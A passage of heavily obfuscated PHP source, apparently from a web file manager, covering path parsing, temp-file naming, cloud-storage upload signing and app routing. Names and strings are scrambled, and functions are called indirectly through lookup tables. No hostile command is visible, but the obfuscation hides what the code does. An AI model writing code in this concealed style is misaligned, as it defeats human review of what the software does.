array($b‡’½ãÚŒÃ[$cŒ”å£ïèì[75]], $b‡’½ãÚŒÃ[$cŒ”å£ïèì[1063]], $b‡’½ãÚŒÃ[$cŒ”å£ïèì[28]]); $e—å¶Ö¥‘‘ = md5(implode($cŒ”å£ïèì[70], $c´ƒœÂ¾Ë‘)) . $cŒ”å£ïèì[91] . get_path_ext($b‡’½ãÚŒÃ[$cŒ”å£ïèì[28]]); } else { $c´ƒœÂ¾Ë‘ = array($AìÀíÂ”…[$cŒ”å£ïèì[28]], $AìÀíÂ”…[$cŒ”å£ïèì[75]], $AìÀíÂ”…[$cŒ”å£ïèì[77]]); $e—å¶Ö¥‘‘ = md5(implode($cŒ”å£ïèì[70], $c´ƒœÂ¾Ë‘)) . $cŒ”å£ïèì[91] . $D–ñ®Ö™ƒØ; } if ($C‰£ÈÒÕôØ == -1) { $EØµ‡–»–Ü = IO_PATH_SYSTEM_TEMP . "\172\151\160\126\x69\x65\x77\57{$fÔ«Û¾¦Æ‚}\x2f{$e—å¶Ö¥‘‘}\56\154\157\x67"; $e†áÍƒÔß¡ = self::infoFull($EØµ‡–»–Ü); if ($e†áÍƒÔß¡) { $EØµ‡–»–Ü = $e†áÍƒÔß¡[$cŒ”å£ïèì[75]]; $aíÌ«–ÈÉŠ = self::getContent($EØµ‡–»–Ü); if ($aíÌ«–ÈÉŠ) { $E–£ß¾¡³’ = json_decode($aíÌ«–ÈÉŠ, !0); if (count($E–£ß¾¡³’) >= $e†ÔƒõİÎ) { show_json(sprintf(LNG($cŒ”å£ïèì[1065]), count($E–£ß¾¡³’)), !1); } return $E–£ß¾¡³’; } } else { $EØµ‡–»–Ü = self::mkfile($EØµ‡–»–Ü); } } $Dœ‚‰‚ Á£ = TEMP_FILES . $fÔ«Û¾¦Æ‚; goto dœ²ùÊ‡Ú; EÕÔĞÔŞİß: self::archiveExt(); del_dir($Dœ‚‰‚ Á£); if (!$a¯ÁÖæšš÷[$cŒ”å£ïèì[1059]]) { show_json($a¯ÁÖæšš÷[$cŒ”å£ïèì[1061]], !1); } goto E×âÇÍ‡ß; eªâõ„ªˆ…: } private static function fileExt($BèÔçœ¬Û) { $bÖ¬ää®õî =& $_SERVER[åÌÛ»ô¢‚ö™]; $Fç ·ĞÅÙ‘ = $BèÔçœ¬Û[$bÖ¬ää®õî[165]]; if ($Fç ·ĞÅÙ‘ == $bÖ¬ää®õî[1068]) { $E»³š‚¿ˆÆ = $bÖ¬ää®õî[1069]; if (substr($BèÔçœ¬Û[$bÖ¬ää®õî[28]], -strlen($E»³š‚¿ˆÆ)) == $E»³š‚¿ˆÆ) { $Fç ·ĞÅÙ‘ = $bÖ¬ää®õî[1070]; } } self::archiveExt($Fç ·ĞÅÙ‘); return $Fç ·ĞÅÙ‘; } private static function zipFileList($e‡ Ì½­å, $F•ƒâ èì¡ = false) { $eì±Œ ˜Ö =& $_SERVER[åÌÛ»ô¢‚ö™]; $cá´Êñé’ = array(); foreach ($e‡ Ì½­å as $CáÑÓèˆ®) { $CÒõÃ¥Ä¦î = $CáÑÓèˆ®[$eì±Œ ˜Ö[75]]; if ($F•ƒâ èì¡) { $CÒõÃ¥Ä¦î = self::copy($CáÑÓèˆ®[$eì±Œ ˜Ö[75]], $F•ƒâ èì¡, $eì±Œ ˜Ö[771]); } else { $C§æä¿ë Ö = self::init($CáÑÓèˆ®[$eì±Œ ˜Ö[75]]); if ($C§æä¿ë Ö->getType() == $eì±Œ ˜Ö[102]) { $CÒõÃ¥Ä¦î = $C§æä¿ë Ö->path; } } if ($CÒõÃ¥Ä¦î && self::local()->exist($CÒõÃ¥Ä¦î)) { $cá´Êñé’[$CáÑÓèˆ®[$eì±Œ ˜Ö[75]]] = $CÒõÃ¥Ä¦î; } } if (!empty($cá´Êñé’)) { return array_values($cá´Êñé’); } show_json(LNG($eì±Œ ˜Ö[1036]), !1); } public static function tmpFileName($eèÏ¼æ¨) { $a‰Ÿ·ô§Œ· =& $_SERVER[åÌÛ»ô¢‚ö™]; $fßè“êÑ»¥ = array($eèÏ¼æ¨[$a‰Ÿ·ô§Œ·[28]], $eèÏ¼æ¨[$a‰Ÿ·ô§Œ·[75]], $eèÏ¼æ¨[$a‰Ÿ·ô§Œ·[77]], $eèÏ¼æ¨[$a‰Ÿ·ô§Œ·[485]]); return md5(implode($a‰Ÿ·ô§Œ·[70], $fßè“êÑ»¥)); } private static function localFilePath($A‹Ûà¼°º·, $C»á¢»øÂ¸) { goto bš†ÅÁ‘¢’; AÁåß•­ƒ‰: if ($CŞã£Ô´Ü[$cË“¼øÂğ˜[29]] == KodIO::KOD_SOURCE) { $CÑ‰¦‡¤à® = Model($cË“¼øÂğ˜[778])->fileInfoGet(KodIO::sourceID($A‹Ûà¼°º·)); if (!$CÑ‰¦‡¤à®[$cË“¼øÂğ˜[75]]) { show_json($cË“¼øÂğ˜[1073], !1); } $A‹Ûà¼°º· = $CÑ‰¦‡¤à®[$cË“¼øÂğ˜[75]]; } $DÑõ ÷óÈ = self::init($A‹Ûà¼°º·); $bé¡‚¼ØñÀ = $DÑõ ÷óÈ->getType(); goto aÜòƒáâ¿ç; aÜòƒáâ¿ç: if ($bé¡‚¼ØñÀ == $cË“¼øÂğ˜[102] || $bé¡‚¼ØñÀ == $cË“¼øÂğ˜[1074]) { if (!$DÑõ ÷óÈ->exist($DÑõ ÷óÈ->path)) { show_json(LNG($cË“¼øÂğ˜[101]), !1); } return $DÑõ ÷óÈ->path; } return !1; goto a¯®òî–Ä; bš†ÅÁ‘¢’: $cË“¼øÂğ˜ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($C»á¢»øÂ¸ == $cË“¼øÂğ˜[1071] && strtoupper(substr(PHP_OS, 0, 3)) == $cË“¼øÂğ˜[1072]) { return !1; } $CŞã£Ô´Ü = KodIO::parse($A‹Ûà¼°º·); goto AÁåß•­ƒ‰; a¯®òî–Ä: } private static function archiveExt($cŸ—ßÉŒ™ = '') { $GLOBALS[$_SERVER[åÌÛ»ô¢‚ö™][1075]] = $cŸ—ßÉŒ™; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\165\162\x63\x65\175"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\x72\x52\x65\143\171\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\173\165\x73\x65\162\106\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\165\163\x65\162\106\x69\154\x65\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\162\x46\151\154\145\124\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\x75\160\122\x6f\157\164\x53\x65\x6c\146\175"; const KOD_USER_SHARE = "\173\165\163\x65\x72\123\150\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\145\162\123\x68\x61\162\x65\x4c\151\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\162\145\124\x6f\x4d\145\175"; const KOD_SHARE_ITEM = "\x7b\163\x68\141\162\x65\111\x74\145\155\175"; const KOD_SHARE_LINK = "\x7b\x73\150\141\x72\x65\111\164\x65\x6d\x4c\x69\x6e\153\175"; const KOD_SEARCH = "\x7b\163\145\141\x72\143\150\175"; const KOD_BLOCK = "\173\x62\x6c\x6f\143\x6b\175"; const KOD_IO = "\173\x69\157\175"; const KOD_USER_RECENT = "\x7b\x75\x73\145\x72\x52\x65\x6e\143\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\x64\x72\x69\x76\145\162\x7d"; public static function typeList() { $bçëªÃãÑ… =& $_SERVER[åÌÛ»ô¢‚ö™]; return array($bçëªÃãÑ…[1076] => self::KOD_SOURCE, $bçëªÃãÑ…[1077] => self::KOD_USER_RECYCLE, $bçëªÃãÑ…[1078] => self::KOD_USER_FAV, $bçëªÃãÑ…[1079] => self::KOD_USER_FILE_TAG, $bçëªÃãÑ…[1080] => self::KOD_USER_FILE_TYPE, $bçëªÃãÑ…[1081] => self::KOD_GROUP_ROOT_SELF, $bçëªÃãÑ…[1082] => self::KOD_USER_SHARE, $bçëªÃãÑ…[1083] => self::KOD_USER_SHARE_LINK, $bçëªÃãÑ…[1084] => self::KOD_USER_SHARE_TO_ME, $bçëªÃãÑ…[1085] => self::KOD_SHARE_ITEM, $bçëªÃãÑ…[1086] => self::KOD_SHARE_LINK, $bçëªÃãÑ…[1087] => self::KOD_SEARCH, $bçëªÃãÑ…[1088] => self::KOD_BLOCK, $bçëªÃãÑ…[1089] => self::KOD_IO, $bçëªÃãÑ…[1090] => self::KOD_USER_RECENT, $bçëªÃãÑ…[1091] => self::KOD_USER_DRIVER); } public static function parse($d»›ÕÆ«ç) { goto B¬ªÖÍÍÎ†; B¬ªÖÍÍÎ†: $b¸•Õ´˜Ü• =& $_SERVER[åÌÛ»ô¢‚ö™]; $d»›ÕÆ«ç = self::clear($d»›ÕÆ«ç); $fº¬öææÊİ = array_values(self::typeList()); goto FôƒØ¨ŒÕö; FôƒØ¨ŒÕö: preg_match($b¸•Õ´˜Ü•[1092], $d»›ÕÆ«ç, $FâŠ‡³Îªà); $Fíô°·“ˆ• = array($b¸•Õ´˜Ü•[413] => !1, $b¸•Õ´˜Ü•[1093] => !1, $b¸•Õ´˜Ü•[410] => !1, $b¸•Õ´˜Ü•[75] => $d»›ÕÆ«ç, $b¸•Õ´˜Ü•[1040] => !1, $b¸•Õ´˜Ü•[1039] => $b¸•Õ´˜Ü•[33]); if (is_array($FâŠ‡³Îªà) && count($FâŠ‡³Îªà) == 5) { $FùÚÔÉø½ß = $b¸•Õ´˜Ü•[1094] . $FâŠ‡³Îªà[2] . $b¸•Õ´˜Ü•[330]; if (in_array($FùÚÔÉø½ß, $fº¬öææÊİ)) { $Fíô°·“ˆ•[$b¸•Õ´˜Ü•[1040]] = $FâŠ‡³Îªà[1]; $Fíô°·“ˆ•[$b¸•Õ´˜Ü•[29]] = $FùÚÔÉø½ß; $Fíô°·“ˆ•[$b¸•Õ´˜Ü•[1095]] = substr($FùÚÔÉø½ß, 1, -1); $Fíô°·“ˆ•[$b¸•Õ´˜Ü•[392]] = $FâŠ‡³Îªà[3]; } $Fíô°·“ˆ•[$b¸•Õ´˜Ü•[1039]] = $FâŠ‡³Îªà[4]; } goto D¡ˆÉàˆ¼«; D¡ˆÉàˆ¼«: $dÙÚßÔÆ ¬ = array($b¸•Õ´˜Ü•[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Fíô°·“ˆ•[$b¸•Õ´˜Ü•[1096]] = in_array($Fíô°·“ˆ•[$b¸•Õ´˜Ü•[29]], $dÙÚßÔÆ ¬); return $Fíô°·“ˆ•; goto eŠ‚ãéŸ»Õ; eŠ‚ãéŸ»Õ: } public static function clear($C•½×™öƒƒ) { goto CÍÑ“äº÷Ä; aãÜ¦ç¯ë: $aĞç¹°ŒêÉ = $a×ŠÏ‚³«ë[1097]; if (substr($C•½×™öƒƒ, 0, 3) == $a×ŠÏ‚³«ë[1098]) { $C•½×™öƒƒ = substr($C•½×™öƒƒ, 3); } while (strstr($C•½×™öƒƒ, $aĞç¹°ŒêÉ)) { $C•½×™öƒƒ = str_replace($aĞç¹°ŒêÉ, $a×ŠÏ‚³«ë[8], $C•½×™öƒƒ); } goto BŠˆ®çÏ‰; CÍÑ“äº÷Ä: $a×ŠÏ‚³«ë =& $_SERVER[åÌÛ»ô¢‚ö™]; $C•½×™öƒƒ = str_replace(array($a×ŠÏ‚³«ë[1015], $a×ŠÏ‚³«ë[183]), $a×ŠÏ‚³«ë[50], $C•½×™öƒƒ); $C•½×™öƒƒ = str_replace($a×ŠÏ‚³«ë[93], $a×ŠÏ‚³«ë[8], $C•½×™öƒƒ); goto aãÜ¦ç¯ë; a ±—¸ÜŠ­: return $C•½×™öƒƒ; goto cÎêäôÊëÁ; BŠˆ®çÏ‰: $C•½×™öƒƒ = preg_replace($a×ŠÏ‚³«ë[1099], $a×ŠÏ‚³«ë[8], $C•½×™öƒƒ); if ($C•½×™öƒƒ == $a×ŠÏ‚³«ë[8]) { return $a×ŠÏ‚³«ë[8]; } $C•½×™öƒƒ = rtrim($C•½×™öƒƒ, $a×ŠÏ‚³«ë[8]); goto a ±—¸ÜŠ­; cÎêäôÊëÁ: } public static function sourceID($Ağ™»¦Â–‡) { $C¸›‡ìÂ =& $_SERVER[åÌÛ»ô¢‚ö™]; $CÖ›µœ‹ß­ = self::parse($Ağ™»¦Â–‡); if ($CÖ›µœ‹ß­[$C¸›‡ìÂ[29]] !== self::KOD_SOURCE) { show_json(LNG($C¸›‡ìÂ[1100]), !1); } return $CÖ›µœ‹ß­[$C¸›‡ìÂ[392]]; } public static function make($dêè¢¾î’…) { if (!$dêè¢¾î’…) { return !1; } return self::makePath(self::KOD_SOURCE, intval($dêè¢¾î’…)); } public static function makeShare($D© ãêá­, $F‘×³æŠš) { return self::makePath(self::KOD_SHARE_ITEM, $D© ãêá­, $F‘×³æŠš); } public static function makeFileTypePath($dˆ‡ïİ’‡…) { return self::makePath(self::KOD_USER_FILE_TYPE, $dˆ‡ïİ’‡…); } public static function makeFileTagPath($A”ùù¤Ú) { return self::makePath(self::KOD_USER_FILE_TAG, $A”ùù¤Ú); } public static function makePath($bãÌíÖ˜ó, $C²â­çÏ†¬ = '', $b—¨Õ…µ˜„ = '') { $FÑ¬î“é¡Ş =& $_SERVER[åÌÛ»ô¢‚ö™]; $BÈÆ§§Æ­ï = substr($bãÌíÖ˜ó, 1, -1); $d‡ĞÌæ´Ğ = $FÑ¬î“é¡Ş[1101] . $BÈÆ§§Æ­ï . $FÑ¬î“é¡Ş[1102] . $C²â­çÏ†¬ . $FÑ¬î“é¡Ş[1103]; $d‡ĞÌæ´Ğ = $b—¨Õ…µ˜„ ? $d‡ĞÌæ´Ğ . $b—¨Õ…µ˜„ . $FÑ¬î“é¡Ş[8] : $d‡ĞÌæ´Ğ; return $d‡ĞÌæ´Ğ; } public static function hashPath($E‘áß‚ğÖÏ) { $B»†‹ÍÍîª =& $_SERVER[åÌÛ»ô¢‚ö™]; $D¯ƒ¬Ûå‹ = is_array($E‘áß‚ğÖÏ) ? $E‘áß‚ğÖÏ : IO::info($E‘áß‚ğÖÏ); $B¦ˆá¶Ü˜˜ = _get($D¯ƒ¬Ûå‹, $B»†‹ÍÍîª[1104], $B»†‹ÍÍîª[33]); if (!$B¦ˆá¶Ü˜˜) { $AÆÜìİ”÷˜ = KodIO::parse($D¯ƒ¬Ûå‹[$B»†‹ÍÍîª[75]]); if (!$AÆÜìİ”÷˜[$B»†‹ÍÍîª[29]]) { $B¦ˆá¶Ü˜˜ = IO::hashSimple($D¯ƒ¬Ûå‹[$B»†‹ÍÍîª[75]]); } } if (!$B¦ˆá¶Ü˜˜) { $B¦ˆá¶Ü˜˜ = md5($D¯ƒ¬Ûå‹[$B»†‹ÍÍîª[75]] . $D¯ƒ¬Ûå‹[$B»†‹ÍÍîª[77]] . $D¯ƒ¬Ûå‹[$B»†‹ÍÍîª[107]]); } return $B¦ˆá¶Ü˜˜; } public static function initSystemPath() { $F»Æƒ‰ãƒ› =& $_SERVER[åÌÛ»ô¢‚ö™]; if (defined($F»Æƒ‰ãƒ›[1105])) { return; } define($F»Æƒ‰ãƒ›[1105], self::systemPath($F»Æƒ‰ãƒ›[1106])); define($F»Æƒ‰ãƒ›[1107], self::systemPath($F»Æƒ‰ãƒ›[1108])); define($F»Æƒ‰ãƒ›[1109], self::systemPath($F»Æƒ‰ãƒ›[1110])); define($F»Æƒ‰ãƒ›[1111], self::systemPath($F»Æƒ‰ãƒ›[1112])); } public static function systemPath($f±ˆÆ¦óŠ) { goto cáí›÷õŞ‚; D¡¦ÊÊËƒë: return $eÌÜÈÈ“î‚; goto Aº×Ÿóóí×; cáí›÷õŞ‚: $Bó™°¤Ô¬ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dùÛ©´…Ç® = $Bó™°¤Ô¬[1113] . ucfirst($f±ˆÆ¦óŠ); $eÌÜÈÈ“î‚ = Model($Bó™°¤Ô¬[1114])->get($dùÛ©´…Ç®); goto aÇÜÔá¶¶¤; aÇÜÔá¶¶¤: if ($eÌÜÈÈ“î‚) { return $eÌÜÈÈ“î‚; } if ($f±ˆÆ¦óŠ == $Bó™°¤Ô¬[1106]) { $eÌÜÈÈ“î‚ = self::make(Model($Bó™°¤Ô¬[778])->systemRootPathAdd($Bó™°¤Ô¬[1115])); } else { $eÌÜÈÈ“î‚ = self::systemPath($Bó™°¤Ô¬[1106]); $F—ÖÆâº’ï = self::sourceID($eÌÜÈÈ“î‚); $eÌÜÈÈ“î‚ = self::make(Model($Bó™°¤Ô¬[778])->mkdir($F—ÖÆâº’ï, $f±ˆÆ¦óŠ)); } Model($Bó™°¤Ô¬[1114])->set($dùÛ©´…Ç®, $eÌÜÈÈ“î‚); goto D¡¦ÊÊËƒë; Aº×Ÿóóí×: } public static function systemFolder($eİºÀ•“) { $c˜¿‰ÎŒ = IO_PATH_SYSTEM_SOURCE . $eİºÀ•“; $b¼İ‡õ§ßò = Cache::get($c˜¿‰ÎŒ); if (!$b¼İ‡õ§ßò) { $A²ÜËÑ„ª¥ = IO::infoFull($c˜¿‰ÎŒ); if (!$A²ÜËÑ„ª¥) { $b¼İ‡õ§ßò = IO::mkdir($c˜¿‰ÎŒ, REPEAT_SKIP); } else { $b¼İ‡õ§ßò = $A²ÜËÑ„ª¥[$_SERVER[åÌÛ»ô¢‚ö™][75]]; } Cache::set($c˜¿‰ÎŒ, $b¼İ‡õ§ßò, 3600 * 10); } return $b¼İ‡õ§ßò; } public static function defaultDriver() { return Model($_SERVER[åÌÛ»ô¢‚ö™][730])->defaultDriver(); } public static function defaultIO() { $còáˆÀ‡¤ =& $_SERVER[åÌÛ»ô¢‚ö™]; $B§ßöÕÑ›Ô = self::defaultDriver(); return $còáˆÀ‡¤[1116] . $B§ßöÕÑ›Ô[$còáˆÀ‡¤[392]] . $còáˆÀ‡¤[1103]; } public static function defaultDriverInit() { static $AÀÎêÜ»ùÆ = false; if ($AÀÎêÜ»ùÆ) { return $AÀÎêÜ»ùÆ; } $AÀÎêÜ»ùÆ = IO::init(self::defaultIO()); return $AÀÎêÜ»ùÆ; } public static function fileTypeList() { $e¼©ÉÂÃæ» =& $_SERVER[åÌÛ»ô¢‚ö™]; $f÷ƒ’ŞÄ•³ = $GLOBALS[$e¼©ÉÂÃæ»[6]][$e¼©ÉÂÃæ»[1117]]; foreach ($f÷ƒ’ŞÄ•³ as $eÑ¤¬îæ¾ => $Aóµò½…¼) { $BéŒáÉ´Œƒ = $e¼©ÉÂÃæ»[1118] . $eÑ¤¬îæ¾; $côÌñöùõ® = LNG($BéŒáÉ´Œƒ); if ($BéŒáÉ´Œƒ != $côÌñöùõ®) { $f÷ƒ’ŞÄ•³[$eÑ¤¬îæ¾][$e¼©ÉÂÃæ»[28]] = $côÌñöùõ®; } } return $f÷ƒ’ŞÄ•³; } public static function transferType($e¯—ÒßÄ—, $CĞ÷‘§ÏÈ”) { goto Aº²å‚÷; Aº²å‚÷: $E¸Ğ×é†Ë‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aŠÎÚšÓÂÛ = self::driverType($e¯—ÒßÄ—); $a¤·™¿âÇô = self::driverType($CĞ÷‘§ÏÈ”); goto D‘Şçä‹; aĞ¢ÔøàÙÅ: return $E¸Ğ×é†Ë‰[1121]; goto D„ø–é´Í¹; D‘Şçä‹: if ($aŠÎÚšÓÂÛ[$E¸Ğ×é†Ë‰[29]] == $a¤·™¿âÇô[$E¸Ğ×é†Ë‰[29]] && $aŠÎÚšÓÂÛ[$E¸Ğ×é†Ë‰[1119]] == $a¤·™¿âÇô[$E¸Ğ×é†Ë‰[1119]]) { return $E¸Ğ×é†Ë‰[1120]; } if ($aŠÎÚšÓÂÛ[$E¸Ğ×é†Ë‰[29]] == $E¸Ğ×é†Ë‰[809] && $a¤·™¿âÇô[$E¸Ğ×é†Ë‰[29]] == $E¸Ğ×é†Ë‰[102]) { return $E¸Ğ×é†Ë‰[1067]; } if ($aŠÎÚšÓÂÛ[$E¸Ğ×é†Ë‰[29]] == $E¸Ğ×é†Ë‰[102] && $a¤·™¿âÇô[$E¸Ğ×é†Ë‰[29]] == $E¸Ğ×é†Ë‰[809]) { return $E¸Ğ×é†Ë‰[103]; } goto aĞ¢ÔøàÙÅ; D„ø–é´Í¹: } public static function driverType($EÉ®¸†ÄƒĞ) { goto eêĞÒöñ·¨; E±‹‡¾­í¶: if ($B÷çŠÖ¡‹Ì == $cõ®óñç[721] || $B÷çŠÖ¡‹Ì == $cõ®óñç[1123] || $B÷çŠÖ¡‹Ì == $cõ®óñç[1124]) { $EÉ®¸†ÄƒĞ = self::defaultDriverInit(); } else { if ($B÷çŠÖ¡‹Ì == $cõ®óñç[1074] || $B÷çŠÖ¡‹Ì == $cõ®óñç[1125]) { $EÉ®¸†ÄƒĞ = IO::init($EÉ®¸†ÄƒĞ->pathParse[$cõ®óñç[1021]]); } } $B÷çŠÖ¡‹Ì = str_replace($cõ®óñç[1122], $cõ®óñç[33], strtolower($EÉ®¸†ÄƒĞ->getType())); if ($B÷çŠÖ¡‹Ì == $cõ®óñç[102]) { return array($cõ®óñç[29] => $cõ®óñç[102], $cõ®óñç[1119] => $cõ®óñç[33], $cõ®óñç[75] => $AÂëÇĞ•»Ã); } goto F×ö‰…ÜÍ; eêĞÒöñ·¨: $cõ®óñç =& $_SERVER[åÌÛ»ô¢‚ö™]; $AÂëÇĞ•»Ã = $EÉ®¸†ÄƒĞ->path; $B÷çŠÖ¡‹Ì = str_replace($cõ®óñç[1122], $cõ®óñç[33], strtolower($EÉ®¸†ÄƒĞ->getType())); goto E±‹‡¾­í¶; F×ö‰…ÜÍ: return array($cõ®óñç[29] => $cõ®óñç[809], $cõ®óñç[1119] => $EÉ®¸†ÄƒĞ->pathDriver, $cõ®óñç[75] => $AÂëÇĞ•»Ã); goto F½ƒ‚†‘ç; F½ƒ‚†‘ç: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($e‘ŒŞ´Áñ‰) { parent::__construct($e‘ŒŞ´Áñ‰); $this->signatureVersion($_SERVER[åÌÛ»ô¢‚ö™][218]); } public function uploadFormData($b†òÑ ‰†¬, $EµÙ¦­Ó» = 3600) { goto aƒé’Ù¬Ä; EË‚‹§±´Ú: $d³¡ÜôØÀ = array($D©‡ƒàĞ¨®[1128] => $eëëˆ©’Š², $D©‡ƒàĞ¨®[1129] => array(array($D©‡ƒàĞ¨®[1130] => $Cœ ƒöİ·), array($D©‡ƒàĞ¨®[1131] => $this->bucket), array($D©‡ƒàĞ¨®[1132], $D©‡ƒàĞ¨®[1133], $D©‡ƒàĞ¨®[33]), array($D©‡ƒàĞ¨®[1134] => $Aªâç’œˆ), array($D©‡ƒàĞ¨®[1135] => $A¶××¹é‚), array($D©‡ƒàĞ¨®[1136] => $this->accessKey), array($D©‡ƒàĞ¨®[1137] => $aÃÎĞçÜŸø))); $d³¡ÜôØÀ = json_encode($d³¡ÜôØÀ); $b¨ªöáœÍÏ = hash_hmac($D©‡ƒàĞ¨®[235], $aÃÎĞçÜŸø, $this->secret); goto AÎ—›Ô«Õ; AÎ—›Ô«Õ: $E±¡Ş¼„“œ = sha1($d³¡ÜôØÀ); $A…âÈ‚ŠÏ¸ = hash_hmac($D©‡ƒàĞ¨®[235], $E±¡Ş¼„“œ, $b¨ªöáœÍÏ); $cºĞÌœÓ¬Œ = array($D©‡ƒàĞ¨®[1130] => $Cœ ƒöİ·, $D©‡ƒàĞ¨®[1134] => $Aªâç’œˆ, $D©‡ƒàĞ¨®[1138] => base64_encode($d³¡ÜôØÀ), $D©‡ƒàĞ¨®[1135] => $A¶××¹é‚, $D©‡ƒàĞ¨®[1136] => $this->accessKey, $D©‡ƒàĞ¨®[1139] => $aÃÎĞçÜŸø, $D©‡ƒàĞ¨®[1140] => $A…âÈ‚ŠÏ¸, $D©‡ƒàĞ¨®[173] => $this->getHost()); goto B˜•˜£“Ÿ‘; dĞÉ­¹øå: $Aªâç’œˆ = $D©‡ƒàĞ¨®[1126]; $eëëˆ©’Š² = gmdate($D©‡ƒàĞ¨®[1127], time() + $EµÙ¦­Ó»); $aÃÎĞçÜŸø = (string) time() . $D©‡ƒàĞ¨®[67] . (string) (time() + $EµÙ¦­Ó»); goto EË‚‹§±´Ú; B˜•˜£“Ÿ‘: return $cºĞÌœÓ¬Œ; goto BƒÇëÀ½ë; aƒé’Ù¬Ä: $D©‡ƒàĞ¨® =& $_SERVER[åÌÛ»ô¢‚ö™]; $Cœ ƒöİ· = $D©‡ƒàĞ¨®[199]; $A¶××¹é‚ = $D©‡ƒàĞ¨®[235]; goto dĞÉ­¹øå; BƒÇëÀ½ë: } public function fileOutLink($EŸç¡³âàÕ) { $A¢Å¡èêÔ« =& $_SERVER[åÌÛ»ô¢‚ö™]; if (substr($EŸç¡³âàÕ, 0, 7) == $A¢Å¡èêÔ«[1141]) { $EŸç¡³âàÕ = $A¢Å¡èêÔ«[1142] . substr($EŸç¡³âàÕ, 7); } header($A¢Å¡èêÔ«[156] . $EŸç¡³âàÕ); die; } } goto e´…®êƒÜĞ; EÙİËÁ¥Ó†: $aß•ç×±ª = $_SERVER[åÌÛ»ô¢‚ö™][576]; class Application { private $defaultModule = "\151\156\144\145\170"; private $defaultController = "\151\x6e\144\x65\170"; private $defaultAction = "\x69\156\x64\145\170"; function __construct() { } public function setDefault($aå‡Ö¼¨åÅ) { goto bÊ¨Ò˜ÁÒ; A½‡¼¹Œê: while (strlen($cÅˆ«‰Ö‹) < $f´¬’Œéëâ[579]) { if (!$cÅˆ«‰Ö‹) { break; } $cÅˆ«‰Ö‹++; } $this->{$_SERVER[µ¨«][3]}($eÃĞÌøÁ¸­[4], array($this, $eÃĞÌøÁ¸­[5])); goto aÀ™­õêÊª; bÊ¨Ò˜ÁÒ: $f´¬’Œéëâ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eÃĞÌøÁ¸­ =& $_SERVER[µ¨«]; $DÖ’—áòÑÇ = $eÃĞÌøÁ¸­[0]($eÃĞÌøÁ¸­[1], $eÃĞÌøÁ¸­[2]($aå‡Ö¼¨åÅ, $eÃĞÌøÁ¸­[1])); goto C…½óä¯É½; C…½óä¯É½: $this->defaultModule = $DÖ’—áòÑÇ[0] ? $DÖ’—áòÑÇ[0] : $this->defaultModule; $this->defaultController = $DÖ’—áòÑÇ[1] ? $DÖ’—áòÑÇ[1] : $this->defaultController; $E‚‡É®‚ Õ = $f´¬’Œéëâ[577]; goto dÄ‚‘¢˜Õù; dÄ‚‘¢˜Õù: if (!$E‚‡É®‚ Õ) { die; } $this->defaultAction = $DÖ’—áòÑÇ[2] ? $DÖ’—áòÑÇ[2] : $this->defaultAction; $cÅˆ«‰Ö‹ = $f´¬’Œéëâ[578]; goto A½‡¼¹Œê; aÀ™­õêÊª: } public function appRun($a³ë¼İ½ªÀ) { goto A„ÎÇ¾´ƒ; A„ÎÇ¾´ƒ: $b¨ñ¾µä =& $_SERVER[åÌÛ»ô¢‚ö™]; $FùÛÃ‘ÙŒ =& $_SERVER[µ¨«]; $e‘ÀÎì°¥¸ = $FùÛÃ‘ÙŒ[0]($FùÛÃ‘ÙŒ[1], $a³ë¼İ½ªÀ); goto Cê¬Ğ“È¦©; AŠå·ÂÛªÜ: $eà‡İ³È­ƒ = $FùÛÃ‘ÙŒ[7]; $d³×ÛÃÅê = $b¨ñ¾µä[582]; if (strlen($d³×ÛÃÅê) < $b¨ñ¾µä[583]) { die; } goto dà¦â³£Ä; Cê¬Ğ“È¦©: $D´èÆÆ¬ÜÒ = $b¨ñ¾µä[580]; if (strlen($D´èÆÆ¬ÜÒ) < $b¨ñ¾µä[581]) { return; } $cğº‘¥ŒßÓ = $FùÛÃ‘ÙŒ[6]($e‘ÀÎì°¥¸[0]); goto AŠå·ÂÛªÜ; a©“¥ºí‹: $FùÛÃ‘ÙŒ[13](array($FùÛÃ‘ÙŒ[14], $FùÛÃ‘ÙŒ[15]), $eà‡İ³È­ƒ . $FùÛÃ‘ÙŒ[18], $a³ë¼İ½ªÀ); goto DÒ–Ù¦ù; dà¦â³£Ä: if ($cğº‘¥ŒßÓ == $FùÛÃ‘ÙŒ[8]) { $eà‡İ³È­ƒ = $FùÛÃ‘ÙŒ[9]; $e‘ÀÎì°¥¸[0] = $FùÛÃ‘ÙŒ[10]; $e‘ÀÎì°¥¸[1] = $e‘ÀÎì°¥¸[1] . $FùÛÃ‘ÙŒ[11]; $a³ë¼İ½ªÀ = $FùÛÃ‘ÙŒ[12]($FùÛÃ‘ÙŒ[1], $e‘ÀÎì°¥¸); $a³ë¼İ½ªÀ = $FùÛÃ‘ÙŒ[2]($a³ë¼İ½ªÀ, $FùÛÃ‘ÙŒ[1]); } $FùÛÃ‘ÙŒ[13](array($FùÛÃ‘ÙŒ[14], $FùÛÃ‘ÙŒ[15]), $eà‡İ³È­ƒ . $FùÛÃ‘ÙŒ[16], $a³ë¼İ½ªÀ); $FùÛÃ‘ÙŒ[17]($a³ë¼İ½ªÀ); goto a©“¥ºí‹; DÒ–Ù¦ù: } private function autorun() { $a†ó”òö›Õ =& $_SERVER[åÌÛ»ô¢‚ö™]; $C¿ùè¡ß¨É =& $_SERVER[µ¨«]; global $config; if ($C¿ùè¡ß¨É[19]($config[$C¿ùè¡ß¨É[20]]) == 0) { return; } foreach ($config[$C¿ùè¡ß¨É[20]] as $b¤øñóÁ¤„ => $eŸ—•Õ¢ĞÃ) { $this->{$_SERVER[µ¨«][21]}($eŸ—•Õ¢ĞÃ); $d—¾¯×£˜Õ 